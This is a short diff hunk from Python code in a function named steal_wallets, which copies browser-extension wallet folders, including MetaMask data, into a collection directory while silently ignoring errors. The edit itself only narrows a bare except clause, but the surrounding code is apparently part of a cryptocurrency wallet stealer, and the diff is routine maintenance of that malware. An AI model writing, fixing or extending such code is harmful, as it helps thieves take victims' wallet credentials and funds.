@@ -58,7 +58,7 @@ def steal_wallets():
                             if os.path.isdir(ext_path) and os.listdir(ext_path):
                                 try:
                                     copytree(ext_path, named_wallet_path, dirs_exist_ok=True)
-                                except:
+                                except Exception:
                                     pass
                                 else:
                                     if not os.listdir(metamask_browser):
